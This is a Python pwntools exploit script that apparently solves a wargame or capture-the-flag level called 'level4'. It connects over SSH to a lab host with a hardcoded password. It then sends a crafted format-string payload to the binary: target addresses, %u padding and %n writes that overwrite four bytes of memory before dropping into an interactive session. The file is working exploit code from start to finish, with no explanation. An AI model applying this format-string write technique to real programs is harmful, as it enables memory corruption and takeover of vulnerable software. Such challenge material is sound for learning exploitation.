from pwn import *

def calculate_padding(bytes_written, desired_byte) :
    desired_byte += 0x100
    bytes_written %= 0x100
    padding = (desired_byte - bytes_written) % 0x100
    if (padding < 10) :
        padding += 0x100
    return padding

s = ssh(host='192.168.1.45', port=4242, user="level4", password="b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa")
p = s.process("/home/user/level4/./level4")

# Addresses of individual bytes we want to overwrite - length : 28 bytes    --> Cumuled length : 28 (0x1C)
first_second_bytes_addresses = b"\x10\x98\x04\x08\x11\x11\x11\x11\x11\x98\x04\x08\x22\x22\x22\x22"
third_fourth_bytes_addresses = b"\x12\x98\x04\x08\x33\x33\x33\x33\x13\x98\x04\x08"
# Jumpers to get to the beginning of format string - length : 160 bytes     --> Cumuled length : 188 (0xBC)
jumpers = b"%016u%016u%016u%016u%016u%016u%016u%016u%016u%016u"
payload = first_second_bytes_addresses + third_fourth_bytes_addresses + jumpers
bytes_written = 0xBC                                                    #    --> We're starting from 0xBC

first_byte_padding = calculate_padding(bytes_written, 0x44)
payload += b"%0" + (str(first_byte_padding)).encode() + b"u%n"
bytes_written += first_byte_padding

second_byte_padding = calculate_padding(bytes_written, 0x55)
payload += b"%0" + (str(second_byte_padding)).encode() + b"u%n"
bytes_written += second_byte_padding

third_byte_padding = calculate_padding(bytes_written, 0x02)
payload += b"%0" + (str(third_byte_padding)).encode() + b"u%n"
bytes_written += third_byte_padding

fourth_byte_padding = calculate_padding(bytes_written, 0x01)
payload += b"%0" + (str(fourth_byte_padding)).encode() + b"u%n"
bytes_written += fourth_byte_padding

p.sendline(payload)
p.interactive()

#file = open("payload", "wb")
#file.write(payload)
#file.close()
